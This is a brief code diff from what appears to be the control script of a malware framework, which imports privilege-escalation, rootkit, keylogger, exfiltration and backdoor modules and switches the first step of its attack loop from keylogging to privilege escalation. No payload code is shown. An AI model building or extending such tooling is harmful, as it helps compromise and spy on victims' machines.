@@ -7,6 +7,8 @@ from time import sleep
 from modules import privesc
 from modules import rootkit
 # from modules import propagation
+
+# from modules import propagation
 from modules import exfiltration
 from modules import keylogger
 from modules import backdoor
@@ -39,7 +41,7 @@ def main():
     }
 
     # First step
-    next_step = "keylogger"
+    next_step = "privesc"
     result = None
 
     while next_step != "clean":
